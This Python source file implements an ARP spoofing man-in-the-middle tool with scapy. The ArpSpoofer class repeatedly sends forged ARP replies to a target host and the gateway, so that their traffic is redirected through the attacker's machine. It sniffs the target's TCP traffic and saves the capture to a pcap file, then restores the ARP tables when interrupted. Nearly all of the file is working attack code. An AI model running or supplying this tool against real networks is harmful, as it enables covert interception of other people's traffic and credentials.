import scapy.all as scapy
import scapy.sendrecv
from cSubprocess import *
from networking import *
import time 

def sniff_packets():
    packets = scapy.sniff(filter='tcp', count=10)
    print(packets.show)

class ArpSpoofer:
    default_gateway_ip = None
    target_ethernet = None
    gateway_ethernet = None

    def __init__(self):
        pass

    # Method to remove an IP address from our own ARP cache
    def rm_address_arp_cache(self, ip_address):
        command = 'arp -d ' + ip_address
        clean_subprocess(command, -1)

    # Method to create Ethernet routing frames
    def create_ether_packets(self, target_mac, gateway_mac):
        self.target_ethernet = scapy.Ether(dst=target_mac) # Create target routing packet
        self.gateway_ethernet = scapy.Ether(dst=gateway_mac) # Create gateway routing packet
    
    # Method to restore ARP tables of all devices
    def cleanup(self, gateway_ip, target_ip):
        print(" cleaning up and exiting arpspoof...\n")

        target_mac = get_mac_address(target_ip)
        gateway_mac = get_mac_address(gateway_ip)

        target_arp = scapy.ARP(op = 2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip , hwdst=target_mac) # Send original IP-MAC pairs to tables in target
        gateway_arp = scapy.ARP(op = 2, psrc=target_ip, hwsrc=target_mac , pdst=gateway_ip, hwdst=gateway_mac) # Send original IP-MAC pairs to tables in gateway

        # Combine the Ethernet frame with the ARP packet
        target_packet = self.target_ethernet / target_arp
        gateway_packet = self.gateway_ethernet / gateway_arp

        # Show the packets
        print(target_packet.show())
        print(gateway_packet.show())

        # Send the packets
        scapy.sendp(target_packet, iface="eth0") # Send to target
        scapy.sendp(gateway_packet, iface="eth0") # Send to gateway

    # Method to spoof ARP tables for target and gateway devices
    def spoof(self, gateway_ip, target_ip):
        try:
            target_filter = "host " + target_ip + " and tcp"
            capture_device = scapy.sendrecv.AsyncSniffer(iface="eth0", filter=target_filter)
            capture_device.start()
            while True:
                target_mac = get_mac_address(target_ip)
                gateway_mac = get_mac_address(gateway_ip)

                self.create_ether_packets(target_mac, gateway_mac) # Create routing frames

                target_arp = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
                gateway_arp = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

                # Combine the Ethernet frame with the ARP packet
                target_packet = self.target_ethernet / target_arp
                gateway_packet = self.gateway_ethernet / gateway_arp

                # Show the packets
                print(target_packet.show())
                print(gateway_packet.show())

                # Send the packets
                scapy.sendp(target_packet, iface="eth0") # Send spoofed ARP replies to target
                scapy.sendp(gateway_packet, iface="eth0") # Send spoofed ARP replies to gateway

                time.sleep(2) # Resend packets every 2 seconds (changing might affect spoofing effectiveness)
        except KeyboardInterrupt:
            capture = capture_device.stop()
            scapy.wrpcap("packet_log.pcap", capture) # Log capture to a file
            self.cleanup(gateway_ip, target_ip) # Restore ARP tables and remove the MITM position